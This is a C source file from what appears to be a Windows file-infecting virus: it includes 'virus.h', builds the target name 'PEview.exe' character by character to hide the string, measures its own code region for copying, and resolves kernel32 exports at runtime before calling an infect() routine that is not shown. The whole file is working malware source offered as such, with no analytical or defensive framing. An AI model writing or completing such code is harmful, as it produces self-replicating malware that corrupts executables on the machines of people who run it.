#include "virus.h"


int run(void) {
  data_t data;

  if (init_data(&data) != 0) {
    return -1;
  }

  PRINT_DEBUG("current code size: %.2f kB\n", (float)(data.codeSize)/ 1000);

  char lel[20];
  lel[0] = 'P';
  lel[1] = 'E';
  lel[2] = 'v';
  lel[3] = 'i';
  lel[4] = 'e';
  lel[5] = 'w';
  lel[6] = '.';
  lel[7] = 'e';
  lel[8] = 'x';
  lel[9] = 'e';
  lel[10] = 0;

  return infect(lel, &data);

}

int init_data(data_t* data) {
  memzero(data, sizeof(data_t));

  data->codeAddress = (void*)run;
  data->codeSize = (uint32_t)((uint8_t*)end_code - (uint8_t*)run);

  data->imageBase = get_image_base();
  data->kernel32Base = get_kernel32_base();

  if (!IS_PE(data->imageBase))
    return 1;

  if (!IS_PE(data->kernel32Base))
    return 2;

  IMAGE_NT_HEADERS* ntHdr = get_nt_header(data->kernel32Base);
  IMAGE_EXPORT_DIRECTORY* exportDir = get_export_directory(data->kernel32Base, ntHdr);

  //printf("module name: %s\n", (uint8_t*)data.kernel32Base + exportDir->Name);

  if(fill_addresses(exportDir, data->kernel32Base, &data->functions) != sizeof(functions_t) / sizeof(fpExitProcess*)) {
    return 3;
  }

  return 0;
}
